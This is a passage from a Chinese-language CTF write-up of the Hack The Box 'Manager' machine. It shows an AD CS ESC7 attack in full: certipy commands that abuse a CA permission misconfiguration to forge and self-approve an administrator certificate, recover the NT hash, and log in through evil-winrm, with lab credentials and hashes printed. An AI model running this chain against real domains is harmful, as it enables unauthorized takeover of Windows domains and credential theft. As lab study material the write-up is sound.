    Certificate Subject                 : CN=manager-DC01-CA, DC=manager, DC=htb
    Certificate Serial Number           : 5150CE6EC048749448C7390A52F264BB
    Certificate Validity Start          : 2023-07-27 10:21:05+00:00
    Certificate Validity End            : 2122-07-27 10:31:04+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : MANAGER.HTB\Administrators
      Access Rights
        Enroll                          : MANAGER.HTB\Operator
                                          MANAGER.HTB\Authenticated Users
                                          MANAGER.HTB\Raven
        ManageCa                        : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
                                          MANAGER.HTB\Raven
        ManageCertificates              : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
    [+] User Enrollable Principals      : MANAGER.HTB\Authenticated Users
                                          MANAGER.HTB\Raven
    [+] User ACL Principals             : MANAGER.HTB\Raven
    [!] Vulnerabilities
      ESC7                              : User has dangerous permissions.
Certificate Templates                   : [!] Could not find any certificate templates
```

ESC7 的本质是 CA 对象的权限错配。ManageCa 允许修改 CA 配置，包括发布哪些模版，分配给谁角色；ManageCertificates 是审核员权限，可以批准挂起的请求。这两个权限单独出现只是可疑，同时落在同一个低权限帐户上，就等于这个人可以自己定规则、自己审批，而 CA 又是整个域的信任根。

Web Enrollment 的 HTTP 和 HTTPS 都是 False，说明 relay 到注册端点那条路不存在，只能走 RPC；User Specifield SAN 是 Disabled，意思是 CA 层面禁止申请者在请求属性里自带 SAN，所以后面不走注 SAN 的写法。

通过 DCOM 直接问 CA 服务自己发布了哪些模版，拿到的是 CA 侧实际启用的清单。清单里大部分是安装时默认发布的模版，SubCA 和 Administrator 按出厂状态时不发布的。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Manager]
└─$ certipy-ad ca -ca 'manager-DC01-CA' -list-templates -u Raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.58.202
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Enabled certificate templates on 'manager-DC01-CA':
    SubCA
    DirectoryEmailReplication
    DomainControllerAuthentication
    KerberosAuthentication
    EFSRecovery
    EFS
    DomainController
    WebServer
    Machine
    User
    Administrator
```

SubCA 模版本来是给下级 CA 用的，特点是允许申请者自行指定 subject，扩展密钥用途放的很宽，因此成了伪造任意身份证书的入口。正常情况下只有管理员能注册它。upn 的值会写进证书的 SAN，后续认证时 PKINT 就按这个字段认人。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Manager]
└─$ certipy-ad req -u Raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -template 'SubCA' -upn 'administrator@manager.htb' -dc-ip 10.129.58.202
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 19
[-] Got error while requesting certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
Would you like to save the private key? (y/N): y
[*] Saving private key to '19.key'
[*] Wrote private key to '19.key'
[-] Failed to request certificate
```

用 ManagerCa 把当前帐户添加进审核员角色，签发取得证书。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Manager]
└─$ certipy-ad ca -ca 'manager-DC01-CA' -add-officer 'Raven' -u Raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.58.202
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
┌──(kali㉿kali)-[~/Work/Kali/Manager]
└─$ certipy-ad ca -ca 'manager-DC01-CA' -issue-request 19 -u Raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.58.202
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate request ID 19
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Manager]
└─$ ls -liah 19.key
3539054 -rw-rw-r-- 1 kali kali 1.7K Oct 20 02:07 19.key
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Manager]
└─$ certipy-ad req -u Raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -retrieve 19 -dc-ip 10.129.58.202 
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Retrieving certificate with ID 19
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@manager.htb'
[*] Certificate has no object SID
[*] Loaded private key from '19.key'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

拿到证书后走 PKINIIT 认证，换回的是目标帐户的 TGT 和 NT hash。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Manager]
└─$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.58.202
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@manager.htb'
[*] Using principal: 'administrator@manager.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
```

使用 hash 登录拿到 Administrator。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Manager]
└─$ evil-winrm -i 10.129.58.202 -u administrator -H ae5064c2f62317332c88629e025924ef
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
manager\administrator
```
